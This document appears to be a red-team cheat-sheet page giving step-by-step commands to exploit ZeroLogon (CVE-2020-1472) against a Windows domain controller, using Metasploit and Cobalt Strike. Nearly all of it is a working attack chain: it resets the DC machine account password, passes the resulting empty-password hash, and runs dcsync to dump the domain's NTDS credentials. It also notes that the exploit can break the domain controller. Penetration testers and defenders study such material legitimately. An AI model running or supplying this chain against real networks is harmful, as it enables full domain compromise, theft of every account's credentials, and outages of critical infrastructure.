---
author(s):
  - Sebastian Dante Alexander
tags:
  - post-exploitation
  - lateral-movement
  - windows
---
# C2 Frameworks

## Metasploit

```
msf > use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
```

## Cobalt Strike

Clone the repository then load the script, the destination is `ZeroLogon-BOF/dist/zerologon.cna`. The console should show a new command `zerologon`.

```
> git clone https://github.com/rsmudge/ZeroLogon-BOF
```

Retrieve Domain name (e.g. `domain.tld`).

```
beacon> net domain
```

Run the exploit bypassing the second argument `iunderstand`. By exploiting this vulnerability we reset the password. This exploit can lead to a failure of the domain controller. WE USE IT LAST.

```
beacon> zerologon iunderstand <domain>.<tld>
```

In case of success we get a response.

```
Success! Use pth .\\\%S 31d6cfe0d16ae931b73c59d7e0c089c0 and run dcsync
```

Do exactly what it says.

```
beacon> pth .\\\%S 31d6cfe0d16ae931b73c59d7e0c089c0
```

And run if everything worked successfully, we get NTDS

```
beacon> dcsync domain.local
```